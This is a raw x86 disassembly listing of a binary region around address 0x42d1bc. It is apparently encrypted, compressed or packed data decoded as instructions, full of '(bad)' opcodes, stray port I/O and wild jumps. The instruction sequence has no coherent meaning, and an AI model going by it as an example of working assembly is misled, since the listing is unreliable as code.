  42d1bc:	mov    ecx,0x54b6fba4
  42d1c1:	adc    al,0xd9
  42d1c3:	adc    BYTE PTR [edx+ebp*1-0x56],dl
  42d1c7:	stos   BYTE PTR es:[edi],al
  42d1c8:	adc    esp,ecx
  42d1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1cb:	jmp    0x9a49a1
  42d1d0:	push   0xffffffc7
  42d1d2:	cmp    BYTE PTR [edi+ecx*1-0x38],al
  42d1d6:	fcmovu st,st(4)
  42d1d8:	jb     0x42d1b5
  42d1da:	in     al,dx
  42d1db:	dec    edi
  42d1dc:	or     edi,DWORD PTR [edx-0x7550914b]
  42d1e2:	stc    
  42d1e3:	into   
  42d1e4:	icebp  
  42d1e5:	ret    0x128a
  42d1e8:	mov    ecx,0xb0ab8bc9
  42d1ed:	(bad)  
  42d1ee:	clc    
  42d1ef:	adc    DWORD PTR [edx+0x48],edx
  42d1f2:	add    bh,bh
  42d1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1f5:	pop    ecx
  42d1f6:	xor    DWORD PTR [edi],0xa998883b
  42d1fc:	fild   DWORD PTR [ecx-0x31]
  42d1ff:	sub    eax,0xbee8eb20
  42d204:	push   eax
  42d205:	xchg   ebx,eax
  42d206:	dec    ebx
  42d207:	and    eax,0x6b856b9e
  42d20c:	xchg   edx,eax
  42d20d:	jae    0x42d1c8
  42d20f:	shl    bh,1
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d228
  42d281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d282:	out    dx,al
  42d283:	add    DWORD PTR ds:0x50001e4,ebx
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    bh,ah
  42d28d:	and    BYTE PTR [ebp-0x6f4ca842],bh
  42d293:	int    0xdb
  42d295:	jb     0x42d269
  42d297:	pop    es
  42d298:	adc    esp,esp
  42d29a:	push   ss
  42d29b:	xlat   BYTE PTR ds:[ebx]
  42d29c:	mov    bl,0xac
  42d29e:	fwait
  42d29f:	xor    al,0xa8
  42d2a1:	in     al,dx
  42d2a2:	test   eax,0xe6727595
  42d2a7:	movntps XMMWORD PTR [edi-0x7d2ebbb0],xmm6
  42d2ae:	sti    
  42d2af:	call   0x8b2a766a
  42d2b4:	loopne 0x42d2b4
  42d2b6:	in     al,0xaf
  42d2b8:	or     al,dl
  42d2ba:	ret    
  42d2bb:	outs   dx,DWORD PTR ds:[esi]
  42d2bc:	push   0x52e77f99
  42d2c1:	mov    edx,cs
  42d2c3:	xchg   edi,eax
  42d2c4:	lods   eax,DWORD PTR ds:[esi]
  42d2c5:	and    edx,DWORD PTR [edi-0x3e]
  42d2c8:	mov    edx,0x9906f3f7
  42d2cd:	xchg   BYTE PTR [ebx-0x20],ah
  42d2d0:	push   ecx
  42d2d1:	add    cl,BYTE PTR [ecx-0x54]
  42d2d4:	lods   eax,DWORD PTR ds:[esi]
  42d2d5:	xor    BYTE PTR es:[ebx+0x179662fd],cl
  42d2dc:	mov    ah,0xc7
  42d2de:	dec    ebp
  42d2df:	xor    al,0x40
  42d2e1:	jg     0x42d339
  42d2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2e4:	loopne 0x42d316
  42d2e6:	aas    
  42d2e7:	push   ds
  42d2e8:	jp     0x42d272
  42d2ea:	out    dx,al
  42d2eb:	addr16 pop edi
  42d2ed:	out    0xfb,al
  42d2ef:	in     eax,dx
  42d2f0:	mov    eax,?
  42d2f2:	out    dx,al
  42d2f3:	push   edi
  42d2f4:	or     bl,BYTE PTR [esi+ecx*4+0x75d845c9]
  42d2fb:	mov    dl,0x78
  42d2fd:	inc    esp
  42d2fe:	add    eax,0x5f6cd4a1
  42d303:	or     al,0x66
  42d305:	mov    ah,0x2d
  42d307:	xor    BYTE PTR [ebx-0x7d],ch
  42d30a:	push   ebx
  42d30b:	sahf   
  42d30c:	(bad)  
  42d30d:	cmp    eax,0xc150d60c
  42d312:	mov    eax,0xbda7c76e
  42d317:	xchg   ecx,eax
  42d318:	mov    dl,0x68
  42d31a:	fcmove st,st(7)
  42d31c:	fdivr  DWORD PTR [eax+0xaf07ac6]
  42d322:	mov    al,ds:0x2de53ee2
  42d327:	cs stc 
  42d329:	and    BYTE PTR [edi+ebp*1],al
  42d32c:	sbb    ebp,ebp
  42d32e:	fcmove st,st(6)
  42d330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d331:	popf   
  42d332:	test   al,0x9c
  42d334:	pop    eax
  42d335:	(bad)  
  42d336:	sbb    dl,BYTE PTR [ebp+0x7f]
  42d339:	stos   BYTE PTR es:[edi],al
  42d33a:	pusha  
  42d33b:	(bad)  
  42d33c:	xchg   edx,eax
  42d33d:	loopne 0x42d3b7
  42d33f:	std    
  42d340:	das    
  42d341:	dec    edi
  42d342:	sar    DWORD PTR [edx+0x483ee31e],1
  42d348:	cdq    
  42d349:	mov    bh,0x56
  42d34b:	aam    0x57
  42d34d:	or     eax,0x89cad576
  42d352:	cli    
  42d353:	xor    BYTE PTR [edx-0x78],ch
  42d356:	fwait
  42d357:	mov    ebx,0xafb52dfe
  42d35c:	loopne 0x42d2ec
  42d35e:	and    al,0x82
  42d360:	(bad)  
  42d361:	(bad)  [edi-0x1d1dd1f9]
  42d367:	retf   0xffea
  42d36a:	call   0x891e9b07
  42d36f:	adc    ebx,eax
  42d371:	adc    DWORD PTR [eax],eax
  42d373:	cmp    ebp,DWORD PTR [esi]
  42d375:	ret    0xbe47
  42d378:	fs aaa 
  42d37a:	mov    ds:0xbf7b2cd9,al
  42d37f:	push   ebp
  42d380:	push   es
  42d381:	cwde   
  42d382:	add    eax,ebp
  42d384:	out    dx,eax
  42d385:	or     edx,DWORD PTR [ecx-0x3c]
  42d388:	lock call DWORD PTR [edx]
  42d38b:	pop    edx
  42d38d:	nop
  42d38e:	repz gs mov dh,0x0
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d401:	mov    ebx,0xe5227000
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0x97000001
  42d40d:	in     al,dx
  42d40e:	mov    cl,al
  42d410:	xchg   ebp,eax
  42d411:	jo     0x42d45f
  42d413:	xor    eax,0x8e9347c5
  42d418:	mov    dl,0xd1
  42d41a:	jo     0x42d3a6
  42d41c:	xor    dl,BYTE PTR [edi+ebx*2-0x1ff107ce]
  42d423:	lds    ecx,FWORD PTR [esi+ecx*2+0x55]
  42d427:	sbb    BYTE PTR [ecx-0x4f26835e],0x4c
  42d42e:	sub    esp,DWORD PTR [ebx]
  42d430:	mov    dl,0x8f
  42d432:	mov    eax,0x6f36a496
  42d437:	(bad)  
  42d438:	xor    ch,BYTE PTR [ecx-0x13]
  42d43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d43c:	and    dl,dh
  42d43e:	int3   
  42d43f:	add    DWORD PTR [eax-0x56],ecx
  42d442:	ins    BYTE PTR es:[edi],dx
  42d443:	xchg   esi,eax
  42d444:	ins    DWORD PTR es:[edi],dx
  42d445:	xor    DWORD PTR [esi+0x31],0xa4f8b01f
  42d44c:	ret    0xa403
  42d44f:	and    BYTE PTR [edi],bh
  42d451:	aaa    
  42d452:	shr    DWORD PTR [eax+0x74b36215],cl
  42d458:	cwde   
  42d459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d45a:	sahf   
  42d45b:	fninit 
  42d45d:	mov    edx,0x49c6d15f
  42d462:	push   cs
  42d463:	and    DWORD PTR [ebx],edx
  42d465:	xor    al,BYTE PTR [edi-0x10]
  42d468:	jmp    0x42d4c2
  42d46a:	add    eax,0x7edfb8af
  42d46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d470:	jp     0x42d418
  42d472:	add    BYTE PTR [edx-0x1],dh
  42d475:	sti    
  42d476:	or     BYTE PTR [edi+0x56aa9166],dh
  42d47c:	pushf  
  42d47d:	adc    esi,0xc865f8bf
  42d483:	int3   
  42d484:	dec    edi
  42d485:	(bad)  
  42d486:	mov    edx,0x4a3c5b3f
  42d48b:	sbb    al,0xd1
  42d48d:	mov    al,0x1c
  42d48f:	mov    al,0x1e
  42d491:	adc    DWORD PTR [esi],edi
  42d493:	sbb    al,0x91
  42d495:	and    eax,0xdf821c9
  42d49a:	cli    
  42d49b:	or     DWORD PTR [edi+0x52],ebp
  42d49e:	add    ah,BYTE PTR [ebp+0x105ecee4]
  42d4a4:	mov    eax,0x2fd106ee
  42d4a9:	mov    ds:0xd06e1b0d,eax
  42d4ae:	je     0x42d513
  42d4b0:	popa   
  42d4b1:	push   ss
  42d4b2:	fsub   st,st(7)
  42d4b4:	mov    al,ds:0x884e1b2a
  42d4b9:	jp     0x42d509
  42d4bb:	js     0x42d474
  42d4bd:	xchg   esp,eax
  42d4be:	mov    ebp,0x4434a276
  42d4c3:	push   esp
  42d4c4:	dec    ecx
  42d4c5:	dec    ecx
  42d4c6:	push   0xc053860b
  42d4cb:	mov    fs,edi
  42d4cd:	or     al,0xb0
  42d4cf:	(bad)  
  42d4d0:	mov    ebx,DWORD PTR [eax-0x25b20e7d]
  42d4d6:	sar    BYTE PTR [edi+0x6],cl
  42d4d9:	test   eax,0xf533b1a5
  42d4de:	add    ebp,esp
  42d4e0:	xor    eax,0xbbf772c7
  42d4e5:	and    DWORD PTR [ebx],esp
  42d4e7:	adc    eax,0xa71a0fe5
  42d4ec:	ror    edi,1
  42d4ee:	push   ebx
  42d4ef:	out    0x97,eax
  42d4f1:	jne    0x42d4ba
  42d4f3:	dec    edx
  42d4f4:	and    eax,0xba8d0c9a
  42d4f9:	add    ah,ah
  42d4fb:	sub    cl,bh
  42d4fd:	inc    ebx
  42d4fe:	pop    edx
  42d4ff:	push   ebp
  42d500:	xchg   ebx,eax
  42d501:	ja     0x42d512
  42d503:	xchg   ebx,eax
  42d504:	or     BYTE PTR [ebx],dh
  42d506:	mov    esp,0x140e44ff
  42d50b:	dec    edx
  42d50c:	jp     0x42d549
  42d50e:	bound  ebx,QWORD PTR [edi]
  42d510:	and    DWORD PTR [eax],eax
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x74c2d9d5,eax
  42d583:	xor    eax,0x1e627
  42d588:	add    eax,0xd6000001
  42d58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d58e:	pop    ecx
  42d58f:	push   cs
  42d590:	(bad)  [edx-0x3f5d5fc5]
  42d596:	ja     0x42d523
  42d598:	mov    cl,0x58
  42d59a:	inc    esp
  42d59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d59c:	sar    BYTE PTR [ebx+0x72f8def1],1
  42d5a2:	mov    WORD PTR [esi+eiz*4],ds
  42d5a5:	mov    ch,0xcd
  42d5a8:	ss or  si,bp
  42d5ac:	in     eax,0x50
  42d5ae:	in     al,dx
  42d5af:	or     al,0x66
  42d5b1:	inc    esi
  42d5b2:	adc    eax,0x1e497e10
  42d5b7:	jns    0x42d5a4
  42d5b9:	cmp    al,bh
  42d5bb:	fdivr  DWORD PTR [eax-0x6e711fc7]
  42d5c1:	div    ebx
  42d5c3:	cmp    DWORD PTR [eax+0x5e],edi
  42d5c6:	cld    
  42d5c7:	add    al,0x6e
  42d5c9:	or     edx,DWORD PTR [ebp-0x69]
  42d5cc:	sbb    eax,0x7987cc04
  42d5d1:	push   ds
  42d5d2:	out    dx,al
  42d5d3:	mov    DWORD PTR [ecx],ecx
  42d5d5:	fs or  al,0x45
  42d5d8:	inc    eax
  42d5d9:	push   esp
  42d5da:	mov    bh,0x2f
  42d5dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5dd:	mov    ?,eax
  42d5df:	scas   al,BYTE PTR es:[edi]
  42d5e0:	xor    BYTE PTR [ebp+edx*2+0x302529bb],ch
  42d5e7:	mov    DWORD PTR [esi+ecx*4+0x5fe5c17],ebp
  42d5ee:	or     eax,0x13b2dc1b
  42d5f3:	adc    eax,0x54fb87ef
  42d5f8:	call   0x53626ac6
  42d5fd:	stc    
  42d5fe:	jg     0x42d60f
  42d600:	sti    
  42d601:	imul   ecx,ebp,0xfd721a68
  42d607:	in     al,0xa7
  42d609:	pop    esi
  42d60a:	jns    0x42d59c
  42d60c:	retf   0xf226
  42d60f:	inc    edx
  42d610:	mov    al,0xc0
  42d612:	pop    esi
  42d613:	int3   
  42d614:	sbb    BYTE PTR [edx],bh
  42d616:	cmp    BYTE PTR [ebp+0xc],bl
  42d619:	jbe    0x42d64a
  42d61b:	sahf   
  42d61c:	sub    ecx,esp
  42d61e:	ffree  st(4)
  42d620:	mov    ebx,edx
  42d622:	inc    ebp
  42d623:	mov    ebx,0x35a32fa3
  42d628:	popf   
  42d629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d62a:	rcr    BYTE PTR [ebx-0x8],0xb0
  42d62e:	js     0x42d5b4
  42d630:	iret   
  42d631:	inc    eax
  42d632:	add    al,0x55
  42d634:	call   0xa87d1e8e
  42d639:	shl    DWORD PTR [edx],cl
  42d63b:	outs   dx,BYTE PTR ds:[esi]
  42d63c:	sbb    BYTE PTR [edx+esi*4+0x7a],bh
  42d640:	mov    ch,0x24
  42d642:	jb     0x42d6b4
  42d644:	dec    eax
  42d645:	inc    edx
  42d646:	xor    DWORD PTR [esi],ecx
  42d648:	jl     0x42d5ea
  42d64a:	push   ebp
  42d64b:	xor    al,0x24
  42d64d:	in     eax,0xf0
  42d64f:	pop    ds
  42d650:	imul   ebp,DWORD PTR [esi],0xbb6423d9
  42d656:	sbb    eax,0x6a2482c1
  42d65b:	sbb    dl,BYTE PTR [ecx]
  42d65d:	pop    esi
  42d65e:	mov    bl,0xf0
  42d660:	pop    es
  42d661:	mov    WORD PTR [ecx+0x67],cs
  42d664:	jo     0x42d6ae
  42d666:	dec    esi
  42d667:	rol    DWORD PTR [edi],0xa0
  42d66a:	call   DWORD PTR [edi+0x4b3a7e4a]
  42d670:	ret    
  42d671:	loop   0x42d654
  42d673:	mov    dl,0xd7
  42d675:	and    ecx,esi
  42d677:	lahf   
  42d678:	fist   WORD PTR [eax]
  42d67a:	fcom   DWORD PTR [ecx-0x1c]
  42d67d:	sbb    edx,DWORD PTR [edx]
  42d67f:	cdq    
  42d680:	sbb    eax,0xffce2ccc
  42d685:	mov    ds:0x32ceb4e5,eax
  42d68a:	lods   al,BYTE PTR ds:[esi]
  42d68b:	xchg   esp,eax
  42d68c:	cmp    ebx,DWORD PTR ds:0xbf0335
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xd3
  42d701:	mov    ecx,0xe72cf3bc
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x1000001
  42d70d:	aas    
  42d70e:	pop    ebx
  42d70f:	xchg   esi,eax
  42d710:	(bad)  
  42d711:	mov    dh,0x64
  42d713:	mov    ds:0x276b4c4a,eax
  42d718:	sbb    BYTE PTR [esi+0x5a2b1277],dl
  42d71e:	fcmovnb st,st(3)
  42d720:	cmp    eax,0x29c8acc8
  42d725:	dec    ebx
  42d726:	push   esp
  42d727:	repnz mov bl,0x2a
  42d72a:	xchg   sp,ax
  42d72c:	mov    ebx,esi
  42d72e:	jnp    0x42d6c3
  42d730:	mov    al,0x96
  42d732:	iret   
  42d733:	out    0xaa,al
  42d735:	jp     0x42d6ca
  42d737:	popaw  
  42d739:	or     bh,BYTE PTR [edx+0x4b704f1d]
  42d73f:	adc    eax,0xbe041c36
  42d744:	rcr    DWORD PTR [ebx+0x63],cl
  42d747:	mov    esp,0xeeeebfca
  42d74c:	fcmovb st,st(1)
  42d74e:	push   ss
  42d74f:	push   es
  42d750:	fs fld st(2)
  42d753:	dec    esi
  42d754:	jg     0x42d7c8
  42d756:	mov    edx,0xc6d4885e
  42d75b:	shr    DWORD PTR [ecx-0x33],0x14
  42d75f:	stos   DWORD PTR es:[edi],eax
  42d760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d761:	adc    ebx,DWORD PTR [ebp+edi*1-0x62]
  42d765:	data16 mov al,0x10
  42d768:	jp     0x42d6f9
  42d76a:	popa   
  42d76b:	dec    esp
  42d76c:	and    BYTE PTR [ebp-0x22],al
  42d76f:	in     eax,dx
  42d770:	scas   eax,DWORD PTR es:[edi]
  42d771:	call   0x5e372a0b
  42d776:	cli    
  42d777:	fmul   DWORD PTR [ecx+esi*8-0x1]
  42d77b:	enter  0x9616,0xf
  42d77f:	fdiv   st(3),st
  42d781:	or     al,0xb1
  42d783:	inc    esp
  42d784:	xor    ebx,DWORD PTR [ebx]
  42d786:	dec    esp
  42d787:	stos   DWORD PTR es:[edi],eax
  42d788:	je     0x42d753
  42d78a:	add    eax,0xbca655e7
  42d78f:	push   esi
  42d790:	cdq    
  42d791:	mov    esi,0x7624fdbd
  42d796:	xor    edi,DWORD PTR ds:[edi+0x3be54159]
  42d79d:	idiv   BYTE PTR [esp+eax*1-0x49]
  42d7a1:	jb     0x42d811
  42d7a3:	rcl    ebx,1
  42d7a5:	add    BYTE PTR [ebx+0x7d],0xc8
  42d7a9:	sar    DWORD PTR [edx],cl
  42d7ab:	sub    ebp,esi
  42d7ad:	int    0x19
  42d7af:	(bad)  
  42d7b1:	jne    0x42d751
  42d7b3:	push   edx
  42d7b4:	jo     0x42d7d7
  42d7b6:	mov    ds:0xabbe7cc6,al
  42d7bb:	jo     0x42d7d5
  42d7bd:	sbb    bl,BYTE PTR [ecx]
  42d7bf:	pushf  
  42d7c0:	xor    edx,esi
  42d7c2:	ins    DWORD PTR es:[edi],dx
  42d7c3:	inc    esi
  42d7c4:	push   0xfd6581da
  42d7c9:	and    dh,BYTE PTR [edi+0x2f922256]
  42d7cf:	push   es
  42d7d0:	jge    0x42d7ef
  42d7d2:	sahf   
  42d7d3:	into   
  42d7d4:	adc    eax,0x2d64cf88
  42d7d9:	pop    ebx
  42d7da:	mov    BYTE PTR [edx],ah
  42d7dc:	or     ch,BYTE PTR [edx+ecx*4]
  42d7df:	shl    BYTE PTR [ebx+eax*8+0x3b],cl
  42d7e3:	bound  ebp,QWORD PTR fs:0x464d471a
  42d7ea:	add    ebx,DWORD PTR [ebx]
  42d7ec:	mov    bl,0x3c
  42d7ee:	rcr    DWORD PTR [eax+0x15],0xf8
  42d7f2:	cmc    
  42d7f3:	xor    DWORD PTR [ecx-0x8],edi
  42d7f6:	jo     0x42d83b
  42d7f8:	(bad)  
  42d7f9:	xlat   BYTE PTR ds:[ebx]
  42d7fa:	in     al,0x3
  42d7fc:	sbb    DWORD PTR [ebx-0xc7861a1],esi
  42d802:	cmp    al,0xff
  42d804:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d806:	mov    fs,eax
  42d808:	xor    edx,ebx
  42d80a:	sbb    dl,bh
  42d80c:	push   DWORD PTR [edi-0x23]
  42d80f:	pushf  
  42d810:	add    BYTE PTR gs:[eax],al
	...
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x1c6961a
  42d881:	(bad)  
  42d882:	cdq    
  42d883:	sbb    esi,DWORD PTR [ecx]
  42d885:	call   0x147d88b
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	rep stos DWORD PTR es:[edi],eax
  42d88e:	xor    al,0xa1
  42d890:	or     DWORD PTR [eax+0x49],ebp
  42d893:	mov    eax,ds:0xcde0c7fe
  42d898:	fnstcw WORD PTR [ecx-0x1662ac83]
  42d89e:	aad    0x5
  42d8a0:	push   0xee27d310
  42d8a5:	je     0x42d83e
  42d8a7:	or     BYTE PTR ds:[eax],0xbf
  42d8ab:	sbb    al,0xd0
  42d8ad:	cli    
  42d8ae:	cmp    esi,DWORD PTR [edx+esi*1]
  42d8b1:	pop    ds
  42d8b2:	sahf   
  42d8b3:	(bad)  
  42d8b4:	pop    ebp
  42d8b5:	loopne 0x42d8f6
  42d8b7:	push   ss
  42d8b8:	(bad)  
  42d8b9:	push   edi
  42d8ba:	sbb    al,0x59
  42d8bc:	jp     0x42d862
  42d8be:	das    
  42d8bf:	pop    ds
  42d8c0:	mov    edi,0x4eac5318
  42d8c5:	mov    ah,0x2b
  42d8c7:	loope  0x42d8c7
  42d8c9:	outs   dx,DWORD PTR ds:[esi]
  42d8ca:	je     0x42d87a
  42d8cc:	xchg   ebp,eax
  42d8cd:	mov    ah,0x64
  42d8cf:	ret    
  42d8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8d1:	push   ds
  42d8d2:	mov    eax,ds:0x519334db
  42d8d7:	cmp    cl,BYTE PTR [edi-0x4423cd55]
  42d8dd:	or     al,0x64
  42d8df:	mov    ds:0x2784da0f,eax
  42d8e4:	iret   
  42d8e5:	pushf  
  42d8e6:	pop    eax
  42d8e7:	dec    edx
  42d8e8:	dec    esi
  42d8e9:	inc    esi
  42d8ea:	scas   eax,DWORD PTR es:[edi]
  42d8eb:	mov    fs,ecx
  42d8ed:	sub    al,0x6e
  42d8ef:	adc    DWORD PTR [edi],ebp
  42d8f1:	in     al,0x4c
  42d8f3:	mov    ecx,0x4a1b4165
  42d8f8:	dec    esp
  42d8f9:	cmp    DWORD PTR [edx],eax
  42d8fb:	mov    esi,0xec6183df
  42d900:	popf   
  42d901:	inc    esi
  42d902:	mov    al,0x6c
  42d904:	jmp    0x42d8dd
  42d906:	dec    edx
  42d907:	inc    ebp
  42d908:	in     al,0x51
  42d90a:	fidiv  DWORD PTR [edx]
  42d90c:	loope  0x42d8e3
  42d90e:	cld    
  42d90f:	jne    0x42d926
  42d911:	and    DWORD PTR [eax+0xb],esi
  42d914:	or     al,0xe6
  42d916:	mov    dh,0x3e
  42d918:	sub    cl,BYTE PTR [esi]
  42d91a:	or     DWORD PTR [ebx-0x21dde2cd],eax
  42d920:	mov    edx,0x31647a2c
  42d925:	pushf  
  42d926:	mov    esp,0x45f98efc
  42d92b:	mov    ds:0x4d02a607,al
  42d930:	jae    0x42d927
  42d932:	pop    edx
  42d933:	retf   0xb301
  42d936:	(bad)  
  42d937:	icebp  
  42d938:	(bad)
  42d93b:	pop    ss
  42d93c:	(bad)  
  42d93d:	not    DWORD PTR [ebx+0x9]
  42d940:	sub    DWORD PTR ds:0x5d763284,ebp
  42d946:	or     eax,0xf70ba938
  42d94b:	aam    0x74
  42d94d:	mov    ebx,0x62b8bcad
  42d952:	mov    dl,0xd
  42d954:	mov    ds:0x6ee2d108,eax
  42d959:	mov    BYTE PTR [ebp+eax*1-0x51],bl
  42d95d:	in     eax,dx
  42d95e:	sbb    ch,dl
  42d960:	ja     0x42d9be
  42d962:	mov    ah,0x78
  42d964:	in     al,dx
  42d965:	dec    ebp
  42d966:	sub    al,0x1
  42d968:	pop    ebx
  42d969:	push   ds
  42d96a:	mov    cl,BYTE PTR [edi+0x652365c0]
  42d970:	(bad)  
  42d972:	xor    bh,BYTE PTR [ebx-0x7a]
  42d975:	fisttp DWORD PTR [eax+ebp*4+0x5c]
  42d979:	inc    ecx
  42d97a:	pop    edx
  42d97b:	mov    eax,gs:0xbf452d33
  42d981:	dec    eax
  42d982:	add    DWORD PTR [esi-0x78a1a332],ebp
  42d988:	ds adc al,0xa8
  42d98b:	inc    esi
  42d98c:	add    BYTE PTR [ebp+0x115c35],0x0
	...
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	sbb    eax,0x36958488
  42da05:	jmp    0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	mov    edi,0x397b368f
  42da11:	cmp    bh,BYTE PTR [ebx+0x1b]
  42da14:	pushf  
  42da15:	dec    eax
  42da16:	test   al,0x54
  42da18:	pop    es
  42da19:	call   0xec9a16c1
  42da1e:	jmp    0x42da5f
  42da20:	and    ah,BYTE PTR [ebx+0x16]
  42da23:	sbb    ebx,eax
  42da25:	sub    eax,0x65d6ea82
  42da2a:	sub    cl,ah
  42da2c:	mov    WORD PTR [ebx+0x6fdf3aaa],cs
  42da32:	add    ecx,DWORD PTR [ebx-0x6bb880b]
  42da38:	mov    dh,0x86
  42da3a:	mov    eax,0xdfb7074f
  42da3f:	dec    DWORD PTR [esi]
  42da41:	dec    ebx
  42da42:	lods   al,BYTE PTR ds:[esi]
  42da43:	cmp    eax,0x8805a581
  42da48:	ins    BYTE PTR es:[edi],dx
  42da49:	push   ebp
  42da4a:	ror    DWORD PTR [eax],0xb
  42da4d:	iret   
  42da4e:	nop
  42da4f:	inc    edi
  42da50:	std    
  42da51:	ret    0x7b46
  42da54:	(bad)  
  42da55:	js     0x42daa1
  42da57:	ret    0xd7a5
  42da5a:	jle    0x42da68
  42da5c:	int    0x4
  42da5e:	xchg   edi,eax
  42da5f:	add    al,BYTE PTR [ecx]
  42da61:	jne    0x42dadb
  42da63:	pop    esi
  42da64:	test   al,0xa7
  42da66:	call   0x90f5:0x18c628c
  42da6d:	fld    TBYTE PTR [edi+esi*1+0x563e947b]
  42da74:	mov    al,0xd8
  42da76:	icebp  
  42da77:	or     DWORD PTR [eax],eax
  42da79:	add    ebp,eax
  42da7b:	sbb    al,0x8d
  42da7d:	inc    ebp
  42da7e:	into   
  42da7f:	into   
  42da80:	mov    edi,DWORD PTR [edx+0x23]
  42da83:	test   DWORD PTR [ebx-0x7e],0xac3e2d4a
  42da8a:	add    bl,BYTE PTR [ecx+0x6134dbe0]
  42da90:	jbe    0x42da69
  42da92:	inc    ebx
  42da93:	push   esp
  42da94:	out    0x9a,eax
  42da96:	aad    0x44
  42da98:	loopne 0x42da9a
  42da9a:	lods   al,BYTE PTR ds:[esi]
  42da9b:	jnp    0x42dab3
  42da9d:	pop    esp
  42da9e:	jecxz  0x42db05
  42daa0:	hlt    
  42daa1:	mov    eax,ds:0xfc6c877e
  42daa6:	push   ebp
  42daa7:	imul   esp,DWORD PTR [ebp-0x36],0x53
  42daab:	inc    ebx
  42daac:	jmp    0xfde5276c
  42dab1:	adc    DWORD PTR [ebp+ebp*2+0x65],0xffffffdd
  42dab6:	ds aaa 
  42dab8:	jbe    0x42daef
  42daba:	fs cdq 
  42dabc:	pushf  
  42dabd:	js     0x42daf2
  42dabf:	(bad)  
  42dac0:	lea    esi,[ebx-0x5b529718]
  42dac6:	adc    eax,0xf4e3fe4d
  42dacb:	outs   dx,DWORD PTR ds:[esi]
  42dacc:	add    eax,0x99553f9
  42dad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dad2:	imul   ebp,DWORD PTR [eax+0x51e5ff62],0x42
  42dad9:	pop    edi
  42dada:	out    0xa,al
  42dadc:	xchg   ecx,eax
  42dadd:	jle    0x42db0d
  42dadf:	dec    esi
  42dae0:	icebp  
  42dae1:	xchg   edx,eax
  42dae2:	sbb    DWORD PTR [bp+si-0x2b],ebx
  42dae6:	stc    
  42dae7:	adc    BYTE PTR [edi+ebp*1],0x83
  42daeb:	and    eax,0x6d0186d2
  42daf0:	mov    dl,0x76
  42daf2:	inc    esp
  42daf3:	nop
  42daf4:	bound  esi,QWORD PTR [ebx-0x6f]
  42daf7:	hlt    
  42daf8:	cli    
  42daf9:	push   ecx
  42dafa:	in     al,0xd5
  42dafc:	aas    
  42dafd:	scas   al,BYTE PTR es:[edi]
  42dafe:	dec    DWORD PTR [esi+esi*8+0x6e2db2c5]
  42db05:	and    bh,BYTE PTR [esi+0x7f]
  42db08:	mov    ds:0x47125add,al
  42db0d:	pushf  
  42db0e:	stc    
  42db0f:	in     al,dx
  42db10:	test   eax,0x0
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db26
  42db81:	mov    bh,BYTE PTR [ebp-0x79]
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x95000001
  42db8d:	bound  ebp,QWORD PTR [edi-0x5e]
  42db90:	mov    ch,0x3c
  42db92:	pinsrw mm5,WORD PTR [ebp-0x4c],0x45
  42db97:	bound  edx,QWORD PTR [ecx]
  42db99:	inc    edx
  42db9a:	mov    ebp,0x3c54d38
  42db9f:	pop    ebx
  42dba0:	jnp    0x42dbdf
  42dba2:	inc    esp
  42dba3:	and    BYTE PTR [ecx+0x39],ch
  42dba6:	xor    al,0x44
  42dba8:	aam    0xf7
  42dbaa:	mov    esi,0x3931142c
  42dbaf:	ds (bad) 
  42dbb1:	jns    0x42dbfc
  42dbb3:	fs cmp al,0xa6
  42dbb6:	jge    0x42dc11
